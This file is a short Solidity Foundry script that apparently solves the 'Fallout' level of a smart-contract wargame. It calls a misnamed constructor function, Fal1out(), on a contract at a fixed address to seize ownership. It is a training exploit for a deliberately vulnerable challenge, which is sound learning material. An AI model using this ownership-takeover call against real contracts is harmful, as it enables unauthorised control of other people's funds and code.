// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Fallout {
    function Fal1out() external;
}

contract Attack is Test {
    Fallout level2 = Fallout(0xA5B0631c5B393d4BF30D2974dF121ea7E8b0e934);

    function test() external {
        vm.startBroadcast();

        // console.log("Current Owner is: ", level2.owner()); // querying current owner
        level2.Fal1out(); // calling the vulnerable function
        // console.log("New Owner is: ", level2.owner()); // checking if the owner changed

        vm.stopBroadcast();
    }
}